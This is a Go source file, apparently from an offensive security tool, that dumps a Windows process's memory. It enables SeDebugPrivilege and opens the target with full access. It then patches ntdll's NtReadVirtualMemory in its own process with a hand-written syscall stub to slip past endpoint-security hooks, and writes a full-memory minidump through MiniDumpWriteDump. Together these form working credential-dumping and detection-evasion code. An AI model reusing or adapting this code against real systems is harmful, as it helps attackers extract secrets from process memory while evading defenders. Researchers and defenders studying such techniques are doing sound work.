package procdump

import (
	"fmt"
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"
)

const (
	PROCESS_ALL_ACCESS = 0x1F0FFF
)

type WindowsDump struct {
	data []byte
}

func (d *WindowsDump) Data() []byte {
	return d.data
}

func ptr(val interface{}) uintptr {
	switch val.(type) {
	case string:
		return uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(val.(string))))
	case int:
		return uintptr(val.(int))
	default:
		return uintptr(0)
	}
}

// Most of the following code comes from
// https://github.com/C-Sto/Jaqen/blob/master/libJaqen/agent/HandySnippets/unhook/unhook.go
func dumpProcess(pid int32) (ProcessDump, error) {
	res := &WindowsDump{}
	if success := setPrivilege("SeDebugPrivilege", true); !success {
		return res, fmt.Errorf("Could not set SeDebugPrivilege on", pid)
	}

	hProc, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(pid))
	if err != nil {
		return res, err
	}
	if hProc != 0 {
		if err = freeNtReadVirtualMemory(); err != nil {
			return res, err
		}
		return minidump(int(pid), int(hProc))
	}
	return res, fmt.Errorf("Could not dump process memory")
}

func setPrivilege(s string, b bool) bool {
	type LUID struct {
		LowPart  uint32
		HighPart int32
	}
	type LUID_AND_ATTRIBUTES struct {
		Luid       LUID
		Attributes uint32
	}
	type TOKEN_PRIVILEGES struct {
		PrivilegeCount uint32
		Privileges     [1]LUID_AND_ATTRIBUTES
	}

	modadvapi32 := syscall.NewLazyDLL("advapi32.dll")
	procAdjustTokenPrivileges := modadvapi32.NewProc("AdjustTokenPrivileges")

	procLookupPriv := modadvapi32.NewProc("LookupPrivilegeValueW")
	var tokenHandle syscall.Token
	thsHandle, err := syscall.GetCurrentProcess()
	if err != nil {
		panic(err)
	}
	syscall.OpenProcessToken(
		thsHandle,                       //  HANDLE  ProcessHandle,
		syscall.TOKEN_ADJUST_PRIVILEGES, //	DWORD   DesiredAccess,
		&tokenHandle,                    //	PHANDLE TokenHandle
	)
	var luid LUID
	r, _, _ := procLookupPriv.Call(
		ptr(0),                         //LPCWSTR lpSystemName,
		ptr(s),                         //LPCWSTR lpName,
		uintptr(unsafe.Pointer(&luid)), //PLUID   lpLuid
	)
	if r == 0 {
		return false
	}
	SE_PRIVILEGE_ENABLED := uint32(0x00000002)
	privs := TOKEN_PRIVILEGES{}
	privs.PrivilegeCount = 1
	privs.Privileges[0].Luid = luid
	privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
	r, _, _ = procAdjustTokenPrivileges.Call(
		uintptr(tokenHandle),
		uintptr(0),
		uintptr(unsafe.Pointer(&privs)),
		ptr(0),
		ptr(0),
		ptr(0),
	)
	return r != 0
}

func getNTReadVirtualSyscall() (byte, error) {
	const (
		win8  = 0x060200
		win81 = 0x060300
		win10 = 0x0A0000
	)
	//                    7 and Pre-7     2012SP0   2012-R2    8.0     8.1    Windows 10+
	//NtReadVirtualMemory 0x003c 0x003c    0x003d   0x003e    0x003d 0x003e 0x003f 0x003f

	syscall_id := byte(0x3f)
	procRtlGetVersion := syscall.NewLazyDLL("ntdll.dll").NewProc("RtlGetVersion")
	type osVersionInfoExW struct {
		dwOSVersionInfoSize uint32
		dwMajorVersion      uint32
		dwMinorVersion      uint32
		dwBuildNumber       uint32
		dwPlatformId        uint32
		szCSDVersion        [128]uint16
		wServicePackMajor   uint16
		wServicePackMinor   uint16
		wSuiteMask          uint16
		wProductType        uint8
		wReserved           uint8
	}
	var osvi osVersionInfoExW
	osvi.dwOSVersionInfoSize = uint32(unsafe.Sizeof(osvi))
	ret, _, err := procRtlGetVersion.Call(uintptr(unsafe.Pointer(&osvi)))
	if ret != 0 {
		return byte(0x00), err
	}

	version_long := (osvi.dwMajorVersion << 16) | (osvi.dwMinorVersion << 8) | uint32(osvi.wServicePackMajor)
	if version_long < win8 { //before win8
		syscall_id = 0x3c
	} else if version_long == win8 { //win8 and server 2008 sp0
		syscall_id = 0x3d
	} else if version_long == win81 { //win 8.1 and server 2008 r2
		syscall_id = 0x3e
	} else if version_long > win81 { //anything after win8.1
		syscall_id = 0x3f
	}
	return syscall_id, nil
}

func freeNtReadVirtualMemory() error {
	sysval, err := getNTReadVirtualSyscall()
	if err != nil {
		return err
	}
	//win64 original values, (todo: add 32bit, and use when in 32bit land)
	shellcode := []byte{
		0x4C, 0x8B, 0xD1, // mov r10, rcx; NtReadVirtualMemory
		0xB8, 0x3c, 0x00, 0x00, 0x00, // eax, 3ch
		0x0F, 0x05, // syscall
		0xC3, // retn
	}
	shellcode[4] = sysval
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procWriteMem := kernel32.NewProc("WriteProcessMemory")
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	rvm := ntdll.NewProc("NtReadVirtualMemory")
	NtReadVirtualMemory := rvm.Addr()
	thsHandle, _ := syscall.GetCurrentProcess()
	r, _, _ := procWriteMem.Call(
		uintptr(thsHandle),                     // this pid (HANDLE hprocess)
		NtReadVirtualMemory,                    // address of target? (LPVOID lpBaseAddress)
		uintptr(unsafe.Pointer(&shellcode[0])), // LPCVOID lpBuffer,
		uintptr(len(shellcode)),                // SIZE_T nSize,
		uintptr(0),                             // SIZE_T *numberofbytes written
	)

	if r == 0 {
		return fmt.Errorf("WriteProcessMemory failed")
	}
	return nil
}

func minidump(pid, proc int) (ProcessDump, error) {
	dump := &WindowsDump{}
	k32 := syscall.NewLazyDLL("Dbgcore.dll")
	minidumpWriteDump := k32.NewProc("MiniDumpWriteDump")
	// TODO: find a better place to store the dump file
	f, err := ioutil.TempFile("", "")

	if err != nil {
		return dump, err
	}
	stdOutHandle := f.Fd()
	r, _, _ := minidumpWriteDump.Call(ptr(proc), ptr(pid), stdOutHandle, 3, 0, 0, 0)
	if r != 0 {
		data, err := ioutil.ReadFile(f.Name())
		dump.data = data
		if err != nil {
			return dump, err
		}
		os.Remove(f.Name())
	}
	return dump, nil
}
